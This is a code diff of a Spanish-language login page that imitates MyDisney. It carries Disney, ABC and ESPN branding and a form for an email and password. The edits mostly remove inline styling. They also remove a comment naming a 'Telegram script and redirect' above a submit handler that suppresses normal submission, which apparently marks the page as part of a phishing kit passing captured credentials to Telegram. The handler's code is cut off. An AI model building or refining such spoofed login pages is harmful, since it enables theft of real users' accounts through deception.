@@ -1,3 +1,4 @@
+<!-- login.html -->
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -8,13 +9,11 @@
 </head>
 <body class="page-form">
   <main>
-    <!-- Logo MyDisney en haut de la carte -->
-    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo" style="width:160px; margin-bottom:24px;"/>
+    <!-- Logo MyDisney -->
+    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1 style="color:#0077ff; margin-bottom:16px;">Iniciar sesión</h1>
-    <p style="color:#333; margin-bottom:24px;">
-      Introduce tu correo electrónico y contraseña para continuar.
-    </p>
+    <h1>Iniciar sesión</h1>
+    <p>Introduce tu correo electrónico y contraseña para continuar.</p>
 
     <form id="loginForm">
       <input type="email" placeholder="Correo electrónico" required/>
@@ -22,11 +21,11 @@
       <button type="submit">Acceder</button>
     </form>
 
-    <!-- Note de bas de page et logos -->
-    <div class="footer-note" style="margin-top:24px; text-align:left;">
+    <!-- Note et logos partenaires -->
+    <div class="footer-note">
       <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
       MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
-      <div class="logos-container" style="margin-top:12px;">
+      <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
         <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
@@ -43,7 +42,6 @@
     <div class="spinner"></div>
   </div>
 
-  <!-- Script Telegram et redirection -->
   <script>
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
